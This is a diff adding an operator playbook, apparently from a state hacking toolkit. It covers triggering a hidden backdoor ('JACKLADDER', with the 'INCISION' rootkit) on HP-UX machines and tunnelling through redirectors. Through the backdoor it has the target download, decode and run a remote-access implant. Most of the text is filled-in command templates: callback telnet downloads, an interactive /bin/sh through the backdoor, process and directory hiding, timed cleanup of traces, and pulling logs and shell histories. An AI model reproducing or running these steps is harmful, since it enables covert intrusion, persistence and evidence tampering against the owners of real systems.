@@ -1,0 +1,300 @@
+###############################################################
+# TRIGGERING HPUX INCISION via JACKLADDER and JACKLADDERHELPER
+###############################################################
+
+### BACKGROUND:
+
+### HP-INCISION provides process and file hiding.  It does NOT provide
+### connection hiding nor does it have a triggering capability in this
+### version (1.1.2.1 for HPUX11.00)
+
+### HP-JACKLADDER differs from other JACKLADDERs because it requires the use
+### of special source ports for triggering.  The purpose of the special source
+### ports is two-fold:  it plays a part in the authentication process for the
+### trigger, and it causes the 'accept' call to wait an extra 5 seconds for
+### input, thus allowing it to work via most redirection (as long as the 
+### roundtrip time between the redirector and the target is less than 5 
+### seconds.)
+
+### JACKLADDERHELPER is an "instant-grat" version listening on an extra port.
+### It only listens until the target reboots.
+### On HPUX, it is typically installed on port 7162 running as 'memlogd'.
+
+### JACKLADDER will take over once the target reboots.  Depending on how it 
+### was installed, it will listen on ports started by inetd (check 
+### /etc/inetd.conf) or on the sendmail port.
+
+### The HP-JACKLADDER and HP-JACKLADDERHELPER special source ports are:
+###	  3, 51, 8213, 12634, 16798, 23247
+
+
+HP-TARGET-IP		self-explanatory
+HP-JL-SOURCE-PORT	3, 51, 8213, 12634, 16798, or 23247
+JL-LISTEN-PORT		before target reboots - double-check but probably 7162; 
+			        after target reboots -  double-check, but probably try (13, 
+                    21, 23, 37, 113)
+NETCAT-PORT		    random for uploading nopen
+LINUX-OP-BOX		local Linux machine (probably 192.168.254.71)
+WIN-OP-BOX		    local Windows machine (probably 192.168.254.72)
+UNIX-REDIR-IP		IP that target will call back to
+WIN-REDIR-IP		IP that target will call back to
+NOPEN_DIR           directory to upload nopen to (/tmp/.scsi usually)
+                    (WILL NEED TO ESCAPE SLASHES)
+NOPEN_NAME          name of nopen on target
+NOPEN_PORT          port to run nopen on
+
+mx
+:%s/HP_TARGET_IP/HP_TARGET_IP/g
+:%s/HP_JL_SOURCE_PORT/HP_JL_SOURCE_PORT/g
+:%s/JL_LISTEN_PORT/JL_LISTEN_PORT/g
+:%s/NETCAT_PORT/NETCAT_PORT/g
+:%s/LINUX_OP_BOX/LINUX_OP_BOX/g
+:%s/WIN_OP_BOX/WIN_OP_BOX/g
+:%s/UNIX_REDIR_IP/UNIX_REDIR_IP/g
+:%s/WIN_REDIR_IP/WIN_REDIR_IP/g
+:%s/NOPEN_DIR/NOPEN_DIR/g
+:%s/NOPEN_NAME/NOPEN_NAME/g
+:%s/NOPEN_PORT/NOPEN_PORT/g
+'x
+
+
+#########################################################
+### TO CONNECT TO JACKLADDER* thru solaris box:
+#########################################################
+
+### Verify the JACKLADDERHELPER port is still listening
+### If the port doesn't respond, the target may have rebooted or JACKLADDER_HELPER died
+### "Connection refused" means that the port isn't listening
+### Otherwise scan for ports that should be started by inetd
+### jackladderhelper port is probably 7162
+
+-scan JL_LISTEN_PORT TARGET_IP
+
+### On Solaris redirector:
+
+-jackpop HP_TARGET_IP JL_LISTEN_PORT UNIX_REDIR_IP HP_JL_SOURCE_PORT
+
+Your Choice[1]  1
+UTC offset?  [0]  
+Which port will we be uploading nopen on?  [44841] NETCAT_PORT
+Which port would you like nopen to listen on?  [48970] NOPEN_PORT
+Nopen to upload[] CORRECT_NOSERVER_FROM_MORERATS
+Which directory would you like to create[/tmp/.dskman] NOPEN_DIR
+What would you like nopen called on target [podd] NOPEN_NAME
+Do you want incision to bless the nopen server? [Yn] Y
+
+Continue? [Yn] Y
+
+### after the upload completes: 
+### close both jackpop windows, 
+### type DONE in -jackpop window
+
+### connect using the -nstun command given by the -jackpop window
+
+############ GO TO WEARCUP SECTION NOW IF SUCCESSFUL #########
+
+######## TROUBLESHOOTING ONLY - avoid syntax errors with commands being executed on target!:
+
+### Test JL from redirector:
+### special source ports: 3, 51, 8213, 12634, 16798, 23247
+### Probably need to redirect output (2>&0 1>&0 as below) for every
+### command run
+
+-jackpop HP_TARGET_IP JL_LISTEN_PORT UNIX_REDIR_IP HP_JL_SOURCE_PORT
+
+3
+0
+Y
+date 2>&0 1>&0
+DONE
+
+##############################################################
+### TO CONNECT TO HP-UX JACKLADDER* thru non-Solaris Unix box:
+##############################################################
+
+### Window 1 on Unix redirector: 
+-tunnel
+l JL_LISTEN_PORT HP_TARGET_IP JL_LISTEN_PORT HP_JL_SOURCE_PORT
+r NETCAT_PORT
+
+### Window 2 on Unix redirector:
+# If nopen calling back:
+-nrtun NOPEN_PORT
+
+# If calling into nopen, don't run this until you run window 4 cmd
+# and nopen appears to be successfully uploaded
+-nstun HP_TARGET_IP:NOPEN_PORT
+
+### Window 3 local
+packrat NOPEN_NAME CORRECT_NOSERVER_IN_MORERATS NETCAT_PORT
+
+### Window 4 local and scripted
+# If calling forward into nopen:
+LD_PRELOAD=/current/bin/connect.so CMD="mkdir NOPEN_DIR; cd NOPEN_DIR; telnet UNIX_REDIR_IP NETCAT_PORT </dev/console >NOPEN_NAME.uu; uudecode NOPEN_NAME.uu ; uncompress -f NOPEN_NAME.Z; chmod 700 NOPEN_NAME; export PATH=.; export D=-lNOPEN_PORT; NOPEN_NAME" RA=UNIX_REDIR_IP RP=HP_JL_SOURCE_PORT HIDEME= nc 127.0.0.1 JL_LISTEN_PORT
+
+# If nopen is calling back:
+LD_PRELOAD=/current/bin/connect.so CMD="mkdir NOPEN_DIR; cd NOPEN_DIR; telnet UNIX_REDIR_IP NETCAT_PORT </dev/console >NOPEN_NAME.uu; uudecode NOPEN_NAME.uu ; uncompress -f NOPEN_NAME.Z; chmod 700 NOPEN_NAME; export PATH=.; export D=-cUNIX_REDIR_IP:NOPEN_PORT; export S=30; NOPEN_NAME" RA=UNIX_REDIR_IP RP=HP_JL_SOURCE_PORT HIDEME= nc 127.0.0.1 JL_LISTEN_PORT
+
+### TROUBLESHOOTING: CMD can be changed to be any string of shell commands.
+### If output from any command in the string desired, you may have to append
+### the string "2>&0 1>&0" to each command 
+### i.e. "ls -la /tmp 2>&0 1>&0; uname -a 2>&0 1>&0"
+###
+### NOTE: you cannot remove or overwrite a running binary on HP-UX, so if
+### you are trying to overwrite something during troubleshooting, this may
+### be why
+
+
+#########################################################
+### TO CONNECT TO JACKLADDER* thru windows box:
+#########################################################
+
+### from windows target, scan JACKLADDERHELPER to see if it's still listening:
+banner -ip HP_TARGET_IP -port JL_LISTEN_PORT
+
+### windows tunnels:
+### ----------------
+# Examples to connect, connect back to packrat window to upload nopen, and -nstun to target:
+
+### connect to JACKLADDER*
+### background redirect -tcp -lplisten JL-LISTEN-PORT -target HP-TARGET-IP JL-LISTEN-PORT HP-JL-SOURCE-PORT -bind WIN-OP-BOX
+### background redirect -tcp -lplisten 7162 -target 10.27.50.41 7162 12634 -bind 192.168.254.72
+background redirect -tcp -lplisten JL_LISTEN_PORT -target HP_TARGET_IP JL_LISTEN_PORT HP_JL_SOURCE_PORT -bind WIN_OP_BOX
+
+
+### callback to PACKRAT window
+### background redirect -tcp -implantlisten NETCAT-PORT -target LINUX-OP-BOX NETCAT-PORT
+### background redirect -tcp -implantlisten 39778 -target 192.168.254.71 39778
+background redirect -tcp -implantlisten NETCAT_PORT -target LINUX_OP_BOX NETCAT_PORT
+
+
+### call forward to NOPEN PORT (default listen port = 32754)
+### background redirect -tcp -lplisten 32754 -target HP-TARGET-IP 32754 -bind WIN-OP-BOX
+### background redirect -tcp -lplisten 32754 -target 10.27.50.41 32754 -bind 192.168.254.72 
+background redirect -tcp -lplisten NOPEN_PORT -target HP_TARGET_IP NOPEN_PORT -bind WIN_OP_BOX
+
+
+### additional nopen windows (increment the lplisten port only):
+### background redirect -tcp -lplisten 32755 -target HP-TARGET-IP 32754 -bind WIN-OP-BOX
+### background redirect -tcp -lplisten 32755 -target 10.27.50.41 32754 -bind 192.168.254.72 
+background redirect -tcp -lplisten ANOTHER_PORT -target HP_TARGET_IP NOPEN_PORT -bind WIN_OP_BOX
+background redirect -tcp -lplisten ANOTHER_ANOTHER_PORT -target HP_TARGET_IP NOPEN_PORT -bind WIN_OP_BOX
+
+### local linux:
+### -----------
+
+# RA = redirector address
+# RP = redirector source port 
+
+# In local window
+packrat NOPEN_NAME CORRECT_NOSERVER_IN_MORERATS NETCAT_PORT
+
+### in a local scripted window:
+LD_PRELOAD=/current/bin/connect.so CMD="mkdir NOPEN_DIR; cd NOPEN_DIR; telnet WIN_REDIR_IP NETCAT_PORT </dev/console >NOPEN_NAME.uu; uudecode NOPEN_NAME.uu ; uncompress -f NOPEN_NAME.Z; chmod 700 NOPEN_NAME; export PATH=.; export D=-lNOPEN_PORT; nscd" RA=WIN_REDIR_IP RP=HP_JL_SOURCE_PORT HIDEME= nc WIN_OP_BOX JL_LISTEN_PORT
+
+### once the target uploads nopen, the LD_PRELOAD window should give you a prompt back;
+### you can then connect to nopen:
+noclient WIN_OP_BOX:NOPEN_PORT
+noclient WIN_OP_BOX:ANOTHER_PORT
+noclient WIN_OP_BOX:ANOTHER_ANOTHER_PORT
+
+######## TROUBLESHOOTING ONLY - avoid syntax errors with commands being executed on target!:
+
+### to run a command on target (do not string together multiple commands):
+### LD_PRELOAD=./connect.so.RHEL4 CMD="uname -a" RA=WIN-REDIR-IP RP=HP-JL-SOURCE-PORT telnet WIN-OP-BOX JL-LISTEN-PORT
+### LD_PRELOAD=./connect.so.RHEL4 CMD="uname -a" RA=10.27.50.50 RP=HP-JL-SOURCE-PORT telnet 192.168.254.72 7162
+
+LD_PRELOAD=/current/bin/connect.so CMD="uname -a" RA=WIN_REDIR_IP RP=HP_JL_SOURCE_PORT nc WIN_OP_BOX JL_LISTEN_PORT
+
+### to create a file on target:
+### LD_PRELOAD=./connect.so.RHEL4 CMD="touch /tmp/.scsi/x " RA=WIN-REDIR-IP RP=HP-JL-SOURCE-PORT telnet WIN-OP-BOX JL-LISTEN-PORT
+### LD_PRELOAD=./connect.so.RHEL4 CMD="touch /tmp/.scsi/x" RA=10.27.50.50 RP=HP-JL-SOURCE-PORT telnet 192.168.254.72 7162
+
+LD_PRELOAD=/current/bin/connect.so CMD="touch /tmp/.scsi/x" RA=WIN_REDIR_IP RP=HP_JL_SOURCE_PORT nc WIN_OP_BOX JL_LISTEN_PORT
+
+### to get an interactive window:
+### LD_PRELOAD=./connect.so.RHEL4 CMD="/bin/sh 2>&0 1>&0" RA=WIN-REDIR-IP RP=HP-JL-SOURCE-PORT nc WIN-OP-BOX JL-LISTEN-PORT
+### LD_PRELOAD=./connect.so.RHEL4 CMD="/bin/sh 2>&0 1>&0" RA=10.27.50.50 RP=HP-JL-SOURCE-PORT nc 192.168.254.72 7162
+
+LD_PRELOAD=./connect.so.RHEL4 CMD="/bin/sh 2>&0 1>&0" RA=WIN_REDIR_IP RP=HP_JL_SOURCE_PORT nc WIN_OP_BOX JL_LISTEN_PORT
+
+
+
+#########################################################
+# Running WEARCUP and NOT using -burn
+#########################################################
+
+### Once connected, you will be in your temporary directory and will need 
+### to clean it up. However, HPUX systems will not allow you to delete an 
+### executable if it's running, nor the directory it's running in.  To 
+### circumvent this, use 'cup' (CleanUp)
+
+-lt
+-rm nscd.uu
+-gs wearcup -h
+
+# change the options for what you want to call cup and how long you want cup
+# to sleep before it kills nopen and cleans your working directory,
+# then run it
+
+-gs wearcup -r snmpd -w 4h
+
+# when it is time to end the op, kill the "sleep" pid to start immediate cleanup
+# to extend the op, kill the pid of the script (now called snmpd) then kill the sleep
+
+# DO NOT -burnBURN !!!!!!
+# use -exit for your windows!!!!!
+
+
+
+#########################################################
+### HP-INCISION technique checks
+#########################################################
+
+
+### Check if JACKLADDERHELPER is still running:
+ps -ef |grep memlogd
+
+### Verify the hidden directory is visible from your hidden process:
+
+-lt /lost+found/3d9892354a360245add0f483f269f384
+
+### Verify the hidden directory is no longer visible when you're in /dev:
+
+cd /dev; ls -la /lost+found/3d9892354a360245add0f483f269f384
+
+### system kernel checks:
+
+### get system configuration value for CPU_VERSION; should return 532
+
+/usr/bin/getconf SC_CPU_VERSION
+
+### get system configuration value for KERNEL_BITS; should return 64
+
+/usr/bin/getconf SC_KERNEL_BITS
+
+### get the status of any kernel modules that are currently loaded
+### if under INCISION, should see krm and krm64
+
+kmadmin -s
+
+### check reboot history
+
+last -15 reboot
+
+### check and pull logs
+
+-lt /var/adm/syslog/syslog*
+-get /var/adm/syslog/syslog*
+
+-lt /etc/rc.log*
+-get /etc/rc.log*
+
+-lt /var/adm/crash
+ 
+-lt /*history
+-lt /root/*history
+-vget /*history /root/*history
+
+#########################################################
+
